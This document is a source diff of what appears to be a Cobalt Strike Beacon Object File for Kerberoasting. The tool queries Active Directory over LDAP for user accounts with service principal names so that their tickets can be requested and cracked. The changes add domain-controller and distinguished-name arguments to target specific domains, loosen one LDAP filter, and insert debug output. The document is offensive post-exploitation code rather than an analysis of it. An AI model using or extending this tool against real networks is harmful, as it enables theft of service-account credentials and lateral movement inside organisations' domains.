@@ -208,7 +208,7 @@ HRESULT FindSPNs(_In_ IDirectorySearch *pContainerToSearch, _In_ BOOL bListSPNs,
 	BOOL bResult = FALSE, bRoast = FALSE;
 	WCHAR wcSearchFilter[BUF_SIZE] = { 0 };
 	LPCWSTR lpwFormat = L"(&(objectClass=user)(objectCategory=person)%ls(!(userAccountControl:1.2.840.113556.1.4.803:=2))(servicePrincipalName=*)(sAMAccountName=%ls))";
-	LPCWSTR lpwFormatNoListSpn = L"(&(objectClass=user)(objectCategory=person)%ls(!(userAccountControl:1.2.840.113556.1.4.803:=2))(sAMAccountName=%ls))";
+	LPCWSTR lpwFormatNoListSpn = L"(&(objectClass=user)(objectCategory=person)%ls(sAMAccountName=%ls))";
 	PUSER_INFO pUserInfo = NULL;
 	INT iCount = 0;
 	DWORD x = 0L;
@@ -507,7 +507,7 @@ CleanUp:
 	return hr;
 }
 
-HRESULT SearchDirectory(_In_ BOOL bListSPNs, _In_ BOOL bExcludeAES, _In_ LPCWSTR lpwFilter) {
+HRESULT SearchDirectory(_In_ BOOL bListSPNs, _In_ BOOL bExcludeAES, _In_ LPCWSTR lpwFilter, _In_ LPCWSTR lpwDC, _In_ LPCWSTR lpwDN) {
 	HRESULT hr = S_OK;
 	HINSTANCE hModule = NULL;
 	IADs* pRoot = NULL;
@@ -537,27 +537,37 @@ HRESULT SearchDirectory(_In_ BOOL bListSPNs, _In_ BOOL bExcludeAES, _In_ LPCWSTR
 	hr = OLE32$IIDFromString(pIADsIID, &IADsIID);
 	hr = OLE32$IIDFromString(pIDirectorySearchIID, &IDirectorySearchIID);
 
-	// Get rootDSE and the current user's domain container DN.
-	hr = ADsOpenObject(L"LDAP://rootDSE",
-		NULL,
-		NULL,
-		ADS_USE_SEALING | ADS_USE_SIGNING | ADS_SECURE_AUTHENTICATION, // Use Kerberos encryption
-		&IADsIID,
-		(void**)&pRoot);
-	if (FAILED(hr)) {
-		BeaconPrintf(CALLBACK_ERROR, "Failed to get rootDSE.\n");
-		goto CleanUp;
-	}
+	// Construct the LDAP path
+    if (lpwDC != NULL && lpwDN != NULL) { // Use DC and DN if provided
+        	MSVCRT$swprintf_s(wcPathName, BUF_SIZE, L"LDAP://%ls/%ls", lpwDC, lpwDN);
+			BeaconPrintf(CALLBACK_OUTPUT, "wcPathName 1: %ls\n", wcPathName);
+	} else if (lpwDC != NULL && lpwDN == NULL) {
+			MSVCRT$swprintf_s(wcPathName, BUF_SIZE, L"LDAP://%ls", lpwDC);
+			BeaconPrintf(CALLBACK_OUTPUT, "wcPathName no DN: %ls\n", wcPathName);
+    } else {
+		// Get rootDSE and the current user's domain container DN.
+        hr = ADsOpenObject(L"LDAP://rootDSE",
+            NULL,
+            NULL,
+            ADS_USE_SEALING | ADS_USE_SIGNING | ADS_SECURE_AUTHENTICATION, // Use Kerberos encryption
+            &IADsIID,
+            (void**)&pRoot);
+        if (FAILED(hr)) {
+            BeaconPrintf(CALLBACK_ERROR, "Failed to get rootDSE.\n");
+            goto CleanUp;
+        }
 
-	OLEAUT32$VariantInit(&var);
-	hr = pRoot->lpVtbl->Get(pRoot, (BSTR)L"defaultNamingContext", &var);
-	if (FAILED(hr)) {
-		BeaconPrintf(CALLBACK_ERROR, "Failed to get defaultNamingContext.");
-		goto CleanUp;
-	}
+		OLEAUT32$VariantInit(&var);
+		hr = pRoot->lpVtbl->Get(pRoot, (BSTR)L"defaultNamingContext", &var);
+		if (FAILED(hr)) {
+			BeaconPrintf(CALLBACK_ERROR, "Failed to get defaultNamingContext.");
+			goto CleanUp;
+		}
 
-	MSVCRT$wcscpy_s(wcPathName, _countof(wcPathName), L"LDAP://");
-	MSVCRT$wcscat_s(wcPathName, _countof(wcPathName), var.bstrVal);
+		MSVCRT$wcscpy_s(wcPathName, _countof(wcPathName), L"LDAP://");
+		MSVCRT$wcscat_s(wcPathName, _countof(wcPathName), var.bstrVal);
+		BeaconPrintf(CALLBACK_OUTPUT, "wcPathName no extras: %ls\n", wcPathName);
+	}
 
 	hr = ADsOpenObject((LPCWSTR)wcPathName,
 		NULL,
@@ -595,6 +605,8 @@ VOID go(IN PCHAR Args, IN ULONG Length) {
 	BOOL bExcludeAES = FALSE;
 	LPCWSTR lpwArgs = NULL;
 	LPCWSTR lpwFilter = NULL;
+	LPCWSTR lpwDC = NULL;
+	LPCWSTR lpwDN = NULL;
 
 	// Parse Arguments
 	datap parser;
@@ -602,6 +614,9 @@ VOID go(IN PCHAR Args, IN ULONG Length) {
 
 	lpwArgs = (WCHAR*)BeaconDataExtract(&parser, NULL);
 	lpwFilter = (WCHAR*)BeaconDataExtract(&parser, NULL);
+    lpwDC = (WCHAR*)BeaconDataExtract(&parser, NULL);
+	lpwDN = (WCHAR*)BeaconDataExtract(&parser, NULL);
+
 	if (lpwArgs != NULL && MSVCRT$_wcsicmp(lpwArgs, L"list") == 0) {
 		bListSPNs = TRUE;
 	}
@@ -621,7 +636,7 @@ VOID go(IN PCHAR Args, IN ULONG Length) {
 		lpwFilter = L"*";
 	}
 
-	hr = SearchDirectory(bListSPNs, bExcludeAES, lpwFilter);
+	hr = SearchDirectory(bListSPNs, bExcludeAES, lpwFilter, lpwDC, lpwDN);
 	if (FAILED(hr)) {
 		GetFormattedErrMsg(hr);
 	}
